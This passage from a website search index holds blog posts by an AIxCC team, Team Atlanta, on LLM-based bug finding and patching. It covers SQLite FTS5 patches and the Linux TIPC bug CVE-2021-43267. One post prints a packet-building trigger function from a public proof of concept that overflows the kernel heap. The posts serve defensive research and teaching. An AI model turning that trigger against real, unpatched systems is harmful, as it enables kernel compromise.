= (i+1 \u0026lt; nArg) ? azArg[i+1] : NULL; + if (zArg == NULL) { + rc = SQLITE_ERROR; + } else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ The auto-generated patch successfully checks the bounds and provides additional protection against null pointer dereference. In this case, Atlantis spent ~15 minutes for the entire building, patch generation, iteration, and correctness-validation process, demonstrating its promising potential for application to real-world software.\nAdmittedly, our patching techniques are still in their prototype stages, as we require more time to apply and evaluate the many new ideas we have. However, the patch above illustrates that LLM-based automated vulnerability remediation is a very feasible direction.\nThanks Seunggi for collecting the statistics when patching the bug.\nOfficial SQLite3 patch Click me to show SQlite3's official patch commit e9b919d550262076d1b8453c3d6852b88822b922 Author: drh \u0026lt;\u0026gt; Date: Tue Aug 6 22:49:01 2024 +0000 Improved robustness of parsing of tokenize= arguments in FTS5. [forum:/forumpost/171bcc2bcd|Forum post 171bcc2bcd]. FossilOrigin-Name: d9f726ade6b258f8723f90d0b04a4682e885e30939eb29773913e4dfc8e85503 diff --git a/ext/fts5/fts5_tokenize.c b/ext/fts5/fts5_tokenize.c index 3e9fdff3e..08de0d60d 100644 --- a/ext/fts5/fts5_tokenize.c +++ b/ext/fts5/fts5_tokenize.c @@ -79,7 +79,7 @@ static int fts5AsciiCreate( int i; memset(p, 0, sizeof(AsciiTokenizer)); memcpy(p-\u0026gt;aTokenChar, aAsciiTokenChar, sizeof(aAsciiTokenChar)); - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;tokenchars\u0026#34;) ){ fts5AsciiAddExceptions(p, zArg, 1); @@ -90,6 +90,7 @@ static int fts5AsciiCreate( rc = SQLITE_ERROR; } } + if( i\u0026lt;nArg ) rc = SQLITE_ERROR; if( rc!=SQLITE_OK ){ fts5AsciiDelete((Fts5Tokenizer*)p); p = 0; @@ -381,17 +382,16 @@ static int fts5UnicodeCreate( } /* Search for a \u0026#34;categories\u0026#34; argument */ - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ if( 0==sqlite3_stricmp(azArg[i], \u0026#34;categories\u0026#34;) ){ zCat = azArg[i+1]; } } - if( rc==SQLITE_OK ){ rc = unicodeSetCategories(p, zCat); } - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ @@ -416,6 +416,7 @@ static int fts5UnicodeCreate( rc = SQLITE_ERROR; } } + if( i\u0026lt;nArg ) rc = SQLITE_ERROR; }else{ rc = SQLITE_NOMEM; @@ -1298,7 +1299,7 @@ static int fts5TriCreate( int i; pNew-\u0026gt;bFold = 1; pNew-\u0026gt;iFoldParam = 0; - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ @@ -1316,6 +1317,7 @@ static int fts5TriCreate( rc = SQLITE_ERROR; } } + if( i\u0026lt;nArg ) rc = SQLITE_ERROR; if( pNew-\u0026gt;iFoldParam!=0 \u0026amp;\u0026amp; pNew-\u0026gt;bFold==0 ){ rc = SQLITE_ERROR; The patch changes the loop boundary and checks early exit to prevent out-of-bounds access. After the loop, there\u0026rsquo;s an additional check:\nif( i\u0026lt;nArg ) rc = SQLITE_ERROR; This check ensures that all arguments were processed. If i is less than nArg after the loop, it means there was an odd numbers of arguments, which is considered an error because the arguments should always come in pairs.\nInterestingly, the maintainer patched fts5UnicodeCreate() and fts5AsciiCreate() as well because similar code patterns existing there. It actually shows the strength of human-write patches because developers remember potential buggy paths in their code base. However, the additional checks are actually unnecessary because the checks are already at the beginning of the functions. It demonstrates human-write patches are not perfect as well.\nstatic int fts5AsciiCreate( void *pUnused, const char **azArg, int nArg, Fts5Tokenizer **ppOut ){ int rc = SQLITE_OK; AsciiTokenizer *p = 0; UNUSED_PARAM(pUnused); if( nArg%2 ){ \u0026lt;---- already checks rc = SQLITE_ERROR; }else{ --\u0026gt; unnecessary checks \u0026lt;--- I believe the maintainers notice the issues so that they changed their patch in b651084 by checking if (nArgs % 2) == 0 at the beginning of fts5TriCreate(). At the same time, they removed the unnecessary patches in fts5AsciiCreate() and fts5UnicodeCreate().\nThe Author\u0026rsquo;s Random Thoughts By leveraging generative AI models (GenAI) as \u0026ldquo;high-level\u0026rdquo; static analysis tools, we can significantly enhance automated bug finding, thanks to their proficiency in code explanation. For example, complex program analysis tasks such as points-to analysis and inter-procedural analysis, which are challenging for traditional compilers, can be approached differently using GenAI through retrieve-augmented generation (RAG). Additionally, GenAI opens new possibilities for automatic exploit generation and vulnerability remediation due to its strong capabilities in code writing.\nHowever, GenAI is not a cure-all and is far from perfect. That\u0026rsquo;s why our hybrid system is designed to improve GenAI\u0026rsquo;s performance in security research by addressing common issues such as LLM hallucinations, scalability, and domain-specific challenges for particular software.\nAIxCC has provided our team with a fantastic opportunity to put into practice the insights gained from decades of security research in both academia and industry. If you\u0026rsquo;re interested in learning more about our team and the work done by our team members, please feel free to contact us!\nFollow us on Twitter/X (@TeamAtlanta24) if you\u0026rsquo;re interested in AI or security.\nDiscovering previously unknown bugs does not count as a valid score in the competition. Team Atlanta secured a finalist spot by submitting the intended bugs and patches for AIxCC.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe word \u0026ldquo;perfect patch\u0026rdquo; is a vague concept in my mind. To clarify, a patch should comprehend the context and semantics of the program and address the actual root causes rather than merely adding superficial checks to bypass address sanitizers (ASAN).\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"section":"Blog","slug":"/blog/post-atl/","title":"Announcing Team Atlanta!","description":"Beginning","date":"August 13, 2024","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl/team_hu_10735b3afab863cf.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"315\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl\\/team_hu_d7c7a8cfea6b78e0.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl/team_hu_de4aeb404ef1d2c1.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl\\/team_hu_7581c14e352d94f1.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Announcement","tags":"team","content":"Hello, world! We are Team Atlanta, the minds behind Atlantis, our innovative AI-driven cybersecurity solution competing in the prestigious DARPA AIxCC.\nOur team is a collaborative powerhouse made up of six leading institutions: Georgia Tech, GTRI, Samsung Research, Samsung Research America, KAIST, and POSTECH. Each of these organizations is led by Georgia Tech alumni, and includes past winners of prestigious hacking competitions such as DEF CON CTF, Pwn2Own and kernelCTF.\nFor the past several months, we have been diligently preparing for this competition, combining our expertise in AI, cybersecurity, and software engineering. Last week, we proudly competed in the AIxCC Semifinals, showcasing our hard work and dedication to advancing cybersecurity through artificial intelligence.\nThe Journey Begins When AIxCC was announced last year, we quickly assembled a team of friends, including Zellic and SSLab. At that time, much was uncertain; details about the game format, scoring rubric, proof-of-vulnerability (PoV), sanitizers, harnesses, supported programming languages, and proof-of-understanding (PoU) were all unclear. Our team, however, started preparing for the competition from last October.\nMany of our team members previously participated in the DARPA Cyber Grand Challenge (CGC) as part of Crspy, where we were responsible for bug finding and exploitation generation. DARPA CGC was an ambitious endeavor that sparked numerous innovative research directions afterward. However, the competition was not without its challenges, particularly due to the gamification of the event; the scoring metrics and rules significantly influenced the outcomes. In the end, the competing Cyber Reasoning Systems (CRS) that focused on operating reactively\u0026ndash;prioritizing the availability score over fixing bugs\u0026ndash; tended to score higher, as exploitation proved to be far more difficult than patching.\nAware of the gamification issues from CGC, we anticipated that to excel in AIxCC our CRS should leverage AI, particularly LLMs, aggressively in various depths and levels of the CRS pipelines. With this in mind, we strategically chose to focus our efforts on two key directions:\nStatic Analysis. To encourage the use of LLMs and set AIxCC apart from CGC, we anticipated that AIxCC would strongly advocate for the adoption of static analysis while steering away from the dominant use of fuzzing1. It\u0026rsquo;s important to note that finding bugs is quite different from finding crash- or bug-triggering inputs. The latter offers a clear advantage in objectively and autonomously verifying the discovered bug, but it has a much narrower scope compared to the former. In practice, the triggering aspect, also known as the reachability problem, is a significantly more challenging and crucial issue to address, where dynamic tools like fuzzing have a clear edge.\nFine-tuning LLMs for Source Code. Specialization is always an advantage when possible. Given that each CRS will likely need to support more than 10 programming languages during the competition, we decided to fine-tune both in-house and open-source models for analyzing code. This approach is conceptually similar to commitPack, but focuses on commits related to bugs like their fixes, bug-introducing commits, descriptions, and public exploits, if available. Our expectation was that training with this data would enable the fine-tuned LLM to reason about security bugs, their fixes, and likely input corpus, more effectively than the foundational model.\nWe quickly realized that to pursue these directions effectively, we first needed a dataset: a benchmark. Our team divided tasks into three areas: 1) static analysis using LLM prompts/agents, 2) developing a C benchmark from sources like CGC and OSS-Fuzz, and 3) collecting a training dataset pairing CVEs with patches and PoCs for open-source projects to fine-tune our in-house code model at Samsung or to leverage open-source LLMs.\nRemarkably, within 4-5 months, we accomplished all three goals, and our LLM-based Cyber Reasoning System (CRS), dubbed Skynet, performed surprisingly well on our benchmark, and fine-tuning on a smaller dataset shows some promises like in python.\nTime flew by. The cold winter of 2023 ended, and we found ourselves in the new year of 2024. I vividly remember that around this time, our dear friends from Zellic left our team to pursue the Small Business Innovation Research (SBIR) track, which DARPA supports with $1 million for the competition. Unfortunately, Georgia Tech and Samsung were not eligible for this award.\nKick-off with Surprises! At the kick-off event on March 29th, AIxCC unveiled the first challenge project: the Linux kernel, along with an example vulnerability, CVE-2021-43267. This bug is well documented, and its PoC exploit is publicly available, making it an excellent example to work on.\nWhat makes this bug even more intriguing is the story behind it. A security researcher audited the Linux kernel source code using CodeQL. Specifically, the researcher was searching for instances where 16-bit size parameters are passed to the kmalloc() function for memory allocation, using a dataflow-based CodeQL query. The intuition was that a 16-bit size parameter could easily lead to an integer overflow when accessing the allocated object. However, the discovered bug was not caused by an integer overflow, but an out-of-bound heap overflow due to a missing sanity check on the size and related inputs.\nstatic bool tipc_crypto_key_rcv(struct tipc_crypto *rx, struct tipc_msg *hdr) { struct tipc_crypto *tx = tipc_net(rx-\u0026gt;net)-\u0026gt;crypto_tx; struct tipc_aead_key *skey = NULL; u16 key_gen = msg_key_gen(hdr); u16 size = msg_data_sz(hdr); u8 *data = msg_data(hdr); ... /* Allocate memory for the key */ skey = kmalloc(size, GFP_ATOMIC); if (unlikely(!skey)) { pr_err(\u0026#34;%s: unable to allocate memory for skey\\n\u0026#34;, rx-\u0026gt;name); goto exit; } /* Copy key from msg data */ skey-\u0026gt;keylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME))); memcpy(skey-\u0026gt;alg_name, data, TIPC_AEAD_ALG_NAME); memcpy(skey-\u0026gt;key, data + TIPC_AEAD_ALG_NAME + sizeof(__be32), skey-\u0026gt;keylen); The skey was allocated with a size based on the user-provided hdr, but skey-\u0026gt;key was copied up to skey-\u0026gt;keylen, which was also user-controlled and could therefore be inconsistent with size. Unfortunately, the kernel did not perform a sanity check on these two parameters, causing an out-of-boundary access.\ncommit fa40d9734a57bcbfa79a280189799f76c88f7bb0 Author: Max VA \u0026lt;maxv@sentinelone.com\u0026gt; Date: Mon Oct 25 17:31:53 2021 +0200 tipc: fix size validations for the MSG_CRYPTO type The function tipc_crypto_key_rcv is used to parse MSG_CRYPTO messages to receive keys from other nodes in the cluster in order to decrypt any further messages from them. This patch verifies that any supplied sizes in the message body are valid for the received message. diff --git a/net/tipc/crypto.c b/net/tipc/crypto.c index c9391d38de85..dc60c32bb70d 100644 --- a/net/tipc/crypto.c +++ b/net/tipc/crypto.c @@ -2285,43 +2285,53 @@ static bool tipc_crypto_key_rcv(struct tipc_crypto *rx, struct tipc_msg *hdr) u16 key_gen = msg_key_gen(hdr); u16 size = msg_data_sz(hdr); u8 *data = msg_data(hdr); +\tunsigned int keylen; + +\t/* Verify whether the size can exist in the packet */ +\tif (unlikely(size \u0026lt; sizeof(struct tipc_aead_key) + TIPC_AEAD_KEYLEN_MIN)) { +\tpr_debug(\u0026#34;%s: message data size is too small\\n\u0026#34;, rx-\u0026gt;name); +\tgoto exit; +\t} + +\tkeylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME))); + +\t/* Verify the supplied size values */ +\tif (unlikely(size != keylen + sizeof(struct tipc_aead_key) || +\tkeylen \u0026gt; TIPC_AEAD_KEY_SIZE_MAX)) { +\tpr_debug(\u0026#34;%s: invalid MSG_CRYPTO key size\\n\u0026#34;, rx-\u0026gt;name); +\tgoto exit; +\t} Two checks were added to fix this bug: verifying that size is greater than the minimum key size, and ensuring that keylen is consistent with size, thereby preventing access beyond the allocated object.\nMisunderstanding 1: PoV Given a massive Linux repository (yes, 20 million lines of code), where should we start? The LLM approach is all about asking the right questions, also known as prompt engineering. We utilized various techniques like Chain-of-Thought (CoT) and Tree-of-Thoughts (ToT), and were exploring Retrieval Augmented Generation (RAG) to quickly identify known 1-day bugs.\nAt that time, context size was limited; the most advanced model, gpt-3.5 turbo (yes, pre-gpt-4 era) from OpenAI, supported 16k tokens, making it crucial to ask the right question! We initially tried identifying potentially vulnerable code snippets using a range of static analysis tools, including CodeQL, Semgrep and various tools from academic publications, and then filtered the results with LLMs. We even considered diffing the upstream Linux kernel against the provided repository, so that our CRS can look at the modified part of the code first.\nWe were confident our decision; to promote the use of AI tools, the AIxCC organizers would design the competition in a way that allows a single CRS codebase to explore any code repository using 10+ programming languages and their combinations.\nAh, around that time, Google had just announced gemini-pro with an impressive 128k context and the potential to support 1 million tokens! Meanwhile, gpt-4 introduced a game-changing feature called function calling, which allows the LLM to select which callback to use and integrate the results back into the prompt at runtime. We felt that everything was evolving favorably for our CRS to adopt these cutting-edge techniques.\nHowever, PoV turned out to mean bug-triggering input or a crashing input. To demonstrate the existence of a bug, each CRS needed to formulate an input that the referee could quickly verify. While this approach is straightforward and objective for the competition, it significantly discourages the adoption of LLMs in finding bugs. Our team quickly realized that we needed to pivot to the dynamic approaches like fuzzing for the competition.\nvoid tipc_trigger(uint8_t *smashbuf, uint32_t smashlen, int seqno) { uint8_t pkt[0x1000]; uint32_t w0, w1, w2, w3, w4, w5; w0 = hdr_version(TIPC_VERSION); w0 |= hdr_size(6); w0 |= hdr_user(MSG_CRYPTO); w0 |= hdr_msg_size(24 + 36 + KEY_SIZE); w1 = 0; w2 = seqno; w3 = NODE_ID; w4 = 0; w5 = 0; memset(pkt, 0, sizeof(pkt)); gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5); memcpy(pkt+24, \u0026#34;HAXX\u0026#34;, 4); *(uint32_t*)(pkt+24+32) = be32(KEY_SIZE + SMASH_SIZE + smashlen); // \u0026lt;- (1) memset(pkt+24+36, \u0026#39;C\u0026#39;, KEY_SIZE); memset(pkt+24+36+KEY_SIZE, \u0026#39;D\u0026#39;, SMASH_SIZE); memcpy(pkt+24+36+KEY_SIZE + SMASH_SIZE, smashbuf, smashlen); tipc_send(pkt, sizeof(pkt)); } Formulating a bug-triggering input, including ensuring its reachability, is a far more challenging task than simply spotting buggy code in the repository. The strength of fuzzing, perhaps the opposite of a sophisticated LLM, is that once a bug is found, you almost always have a bug-triggering input.\nIn CVE-2021-43267, using CodeQL and auditing, one could identify this bug, but triggering it is an entirely different challenge, not to mention exploiting it. For example, TIPC must be properly set up first, and the keylen needs to be precisely crafted in (1) to trigger the bug.\nMisunderstanding 2. Harnesses Sorry, what\u0026rsquo;s the input needed to trigger CVE-2021-43267? even with a fuzzer?\nTo fuzz the Linux kernel, we needed a user program that calls a sequence of system calls with various arguments. Considering the Linux kernel has over 400 system calls to explore, this was far from ideal for a competition setting.\nWe initially assumed that harnesses and test cases would be provided to indicate which parts of the Linux kernel should be checked for bugs. To tackle this, we implemented and adopted various versions of Linux kernel fuzzers, including a custom kernel syscall fuzzer with kcov and kcmp, and also utilized the most popular Linux fuzzer, Syzkaller. However, our focus remained on determining which sequences of system calls to test, using syscall traces and static analysis of the provided program, and then correctly formulating an end-to-end userspace program to trigger the bug.\n/*** * Blob begins with a 4 byte command count * [4-bytes command count] * Currently there are two commands: * 0 - send a packet blob * [4-bytes size][4-bytes send flags][size-bytes packet data] * 1 - send a netlink packet * [4-bytes Message Type][4-bytes Message Flags][4-bytes Netlink Protocol][4-bytes size][size bytes data] * blob_size MUST be a trusted value */ int harness( uint8_t *blob, uint32_t blob_size) { ... } The Linux Kernel CP was announced in April and came with a harness, linux_test_harness.c. This announcement was full of surprises; the program\u0026rsquo;s structure was provided by the harness, which is alas what we primarily focused on, and the blob needed to be fed to the harness in a way that triggers the bug. The types of system calls we could interact with were limited by the harness, and our task was to find the right data input that would lead the harness to invoke the necessary sequence of system calls with the correct parameters. In other words, we needed to understand the harness first before dealing with the Linux kernel bugs.\nLater, the Jenkins harness was announced, and more surprisingly, it was a fuzz driver (often called a fuzzing harness), a standalone program designed to invoke APIs for fuzz testing. In May, a new CP, called mock-cp (a userspace program), was introduced along with a new harness format, which was simply a shell script executing a CP binary with the provided input. Such diverse formats got us thinking that our CRS should adopt LLM to figure out the structure of the programs and CPs first; like how to compile, how to correctly run, etc.\nBy June, the harness format was officially established - surprisingly, yet not entirely unexpected: libfuzzer for userspace programs (mock-cp and Nginx), jazzer for Java programs (Jenkins), while retaining the blob-based harness for the Linux kernel. We continually updated our CRS to adapt to these changes, but many of these decisions rendered our LLM-based components unnecessary. This decision, however, greatly helped all the participating teams by reducing the engineering time needed for game operation. Unfortunately, we were too proactive in reacting to these changes and ended up wasting some engineering time as a result üòä.\nA harness\u0026rsquo;s role is crucial in the AIxCC competition; it sets the context for the CRS to trigger the bug and serves as a key factor in adjusting the difficulty of bug discovery. Therefore, it\u0026rsquo;s important to strike a balance: it should provide enough detail to relieve the CRS from unnecessary burdens, allowing it to focus on bug finding, but without revealing too much information about the bugs.\nMisunderstanding 3. Proof-of-understanding Unlike CGC, which treated the PoV (a proof-of-concept exploit) as sufficient proof of bug discovery, AIxCC required additional information‚Äîspecifically, the bug type as classified by CWE, to be provided along with the PoV. This was an interesting decision, as AIxCC required CRS to find bugs in the source code, whereas CGC focused on discovering bugs in binaries.\nOur team spent a lot of time brainstorming how to accurately identify CWE categories, primarily by using LLM prompts that leverage crashing inputs, sanitizer reports, related code snippets, outputs from static analyzers, and more. However, the notion of CWEs can be ambiguous when used as a scoring mechanism for the competition. For instance, should CVE-2021-43267 be classified as (1) CWE-122 (Heap-based Buffer Overflow), (2) CWE-787 (Out-of-bounds Write), or (3) CWE-20 (Improper Input Validation)? The first two describe the symptoms caused by the bug, while the third identifies the root cause, as the patch for this bug involved adding input validations.\nIn the end, AIxCC shifted the focus from PoV to identifying the bug-introducing commit (BIC) - the specific hash or commit ID in the git repository. Combined with the fuzzing harness and PoV, the CRS\u0026rsquo;s task was to run the fuzzing harness and perform a git-bisect to pinpoint the BIC in the repository. We did a simple bisecting in the semifinal but lots of improvement required to be functional for the final event.\nMisunderstanding 4. Semantic patching Patching is one of the most intriguing aspects of AIxCC. In CGC, the PoV was typically a simple exploit (like arbitrary read/write/execute), so mitigation strategies (e.g., adding a stack canary) could effectively thwart the PoV. In fact, patches could be applied without even knowing the specific bug; for example, adding a stack canary to all functions in a binary can prevent buffer overflow exploits that might exist in some places.\nThe challenge in CGC was that the focus was on the binary, and the organizers introduced rules such as a minimum number of bytes changed and performance overheads added to the scoring rubric (e.g., instrumenting all memory accesses to prevent out-of-bound errors). These rules were designed to encourage competitors to generate correct patches. Ultimately, this forced CRS to weigh the pros and cons of universal patching, as both exploiting and patching were extremely difficult during the CGC era, resulting in a trade-off between losing points from exploitation versus losing points from patching and availability.\nIn AIxCC, the CRS must generate a semantically correct patch that not only fixes the identified PoV but also maintains the functional correctness of the CP. This is a tricky task, as correctness cannot be formally defined for CRS - some functional changes may be acceptable, while others may not, depending on the code owner\u0026rsquo;s criteria. One approach to addressing this ambiguity is to provide test code to see if the patch passes the provided, so-called public tests. However, CRS must still account for private tests set by the organizers.\nIn the semifinals, our CRS submitted a patch that successfully prevented the crash and passed the public tests given to us during the competition, but was ultimately rejected in the private functionality tests. We\u0026rsquo;re eager to learn more about the bug and the patch!\nMisunderstanding 5: Sanitizers The concept of sanitizers was unclear to our team until we encountered their concrete implementation for memory-safe languages like Java, and more specifically, for Jenkins, a web application written in Java! The role of a sanitizer, essentially a bug oracle, is to determine whether a bug has been correctly triggered.\nIn memory-unsafe languages like C, standard tools like ASAN and UBSAN can serve as sanitizers to catch memory-safety issues with low or no false positives (e.g., out-of-bound accesses should never occur). However, in memory-safe languages, things get trickier. For example, is executing a command a legitimate feature in CI tools like Jenkins, or should it be treated as a command injection (CWE-78)?\nIn other words, sanitizers are more CP-specific rather than programming language-specific; each CP needs to provide custom sanitizers (e.g., path traversal sanitizers).\nOur team initially spent time working on finding web-related bugs like XSS or CSRF in Jenkins - areas where we believed LLMs could excel in seed generation. However, once AIxCC announced that the sanitizers for Java would be jazzer sanitizers, we decided to shift our focus more towards standard jazzer-based fuzzing.\nSemifinal Our team dedicated most of our engineering effort to building a CRS for the Linux Kernel, and we\u0026rsquo;re proud that our CRS was able to find and correctly generate a patch for CVE-2021-43267 in the end. However, during the semifinal, it appeared that only one harness was provided, similar to the exemplar, and none of the CRSes functioned properly for the Linux Kernel. We loved to know more about how our Linux CRS functioned during the competition.\nIn summary, our CRS earned a total of six achievement badges: five for discovering bugs (i.e., first bloods) and one for a patch.\nOur CRS found several unique bugs, which we will describe in a later blog post!\nAside from the known CPs‚ÄîLinux (C), Jenkins (Java), and Nginx (C) - there were new CPs introduced, namely Tika (Java) and sqlite3 (C). Our CRS performed relatively well on sqlite3, but unfortunately, our Java CRS struggled with Tika. We would love to learn more about what happened during the competition. Tika, a popular file format parser, has many unique features, such as recursively parsing embedded objects, which may have contributed to the challenges we faced.\nLooking Ahead to the AIxCC Final üéâ AIxCC Finalists\rWe are thrilled that our team has advanced to the AIxCC finals! We have several ideas that could make the competition even more exciting:\nDifferent execution times based on code complexity.\nThe Linux kernel, with its 6,000 files and 20 million lines of code, requires substantial time for bookkeeping like building, bootstrapping, and bisecting. Compared to smaller programs (e.g., 200k in Tika), it would be beneficial to allocate more time for CRSes to navigate such complex codebases.\nMore programming languages and their combinations.\nTop candidates include Python, Rust, and JavaScript/HTML, along with combinations like JNI (C) in Java or Rust device drivers in the Linux kernel. These would offer a more comprehensive evaluation of CRS capabilities in diverse and challenging settings where CRS is most needed.\nStandardized execution environments.\nStandardizing the compiler (e.g., clang-18), runtime (e.g., JVM version), and base Docker image ahead of time would help teams explore more advanced techniques, such as LLM-based instrumentation, in a controlled environment.\nImproved visualization during the competition.\nWhile the AIxCC village was impressively set up, competing teams and participants had limited visibility into the competition\u0026rsquo;s progress and how each CRS was functioning. To capture more attention from the DEF CON audience, it would be beneficial to expose more technical information during the competition - such as showing current prompts of each CRS in turn, their CPU usage, or even stdout from CRSes (for fun), along with explanations of the progress.\nWith our baseline system up and running, it‚Äôs time for our team to explore the possibility of incorporating LLMs or ML techniques into our CRS workflow. If you‚Äôre passionate about AIxCC and as committed to the competition as we are, feel free to contact us!\nWe are fortunate to have support from generous sponsors like GT/GTRI, Samsung, and KAIST/NYU. If your company is interested in sponsoring our team, we would be happy to discuss further!\nLast but not least, we want to extend our heartfelt thanks to the AIxCC organizers for launching the competition we\u0026rsquo;ve been craving. Hackers thrive on competition-driven innovation, and this has been an exciting opportunity for all of us.\nI think it‚Äôs one of the worst names ever chosen by a security researcher; non-security folks often think it\u0026rsquo;s a really dumb technique. But if you dig into the details, it\u0026rsquo;s actually an impressive AI tool. It operates entirely autonomously, adapting to unknown code, self-learning from past executions, using feedback loops similar to backpropagation, and employing cost functions like coverage maps, and more! Most importantly, like deep learning, it works incredibly well in practice!\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"}]